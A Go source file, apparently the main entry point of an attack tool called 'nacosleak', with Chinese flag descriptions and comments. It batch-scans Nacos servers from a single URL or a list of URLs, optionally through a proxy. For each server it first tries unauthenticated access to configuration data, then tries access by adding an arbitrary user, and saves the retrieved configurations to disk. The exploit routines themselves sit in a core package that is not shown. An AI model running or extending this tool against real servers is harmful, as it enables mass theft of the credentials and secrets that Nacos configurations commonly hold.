package main

import (
	"flag"
	"fmt"
	"nacosleak/core"
	"nacosleak/utils"
	"sync"
)

var (
	Url      string
	UrlsFile string
	BasePath string
	Proxy    string
	targets  []string
)

func main() {
	flag.StringVar(&Url, "t", "", "目标nacos的url")
	flag.StringVar(&UrlsFile, "ts", "", "批量扫描，含有URLs的txt文件路径")
	flag.StringVar(&BasePath, "s", "", "保存到指定路径（可选）")
	flag.StringVar(&Proxy, "p", "", "代理地址（可选）")
	flag.Parse()
	fmt.Println(utils.Banner())
	if UrlsFile != "" {
		urls, err := utils.ReadTargetFile(UrlsFile)
		if err != nil {
			fmt.Println("打开文件失败")
			return
		}
		targets = append(targets, urls...)
	} else if Url != "" {
		targets = append(targets, Url)
	}
	var wg sync.WaitGroup
	fmt.Println("[*] 目标Total:", len(targets))
	for _, target := range targets {
		wg.Add(1)
		go func(target string) {
			defer wg.Done()
			taskRun(target)
		}(target)
	}
	wg.Wait()

}

func taskRun(target string) {
	fmt.Println("[+] start target: ", target)
	cli, err := core.NewNacosClient(target, Proxy)
	if err != nil {
		fmt.Println(err)
		return
	}
	//先尝试未授权
	if err = core.GetConfigUnAuth(cli); err != nil {
		fmt.Println(err)
		return
	} else {
		//任意用户添加
		err = core.GetConfigWithAuth(cli)
		if err != nil {
			fmt.Println(err)
			return
		}
	}
	if err = cli.SaveConfig(BasePath); err != nil {
		return
	}

}
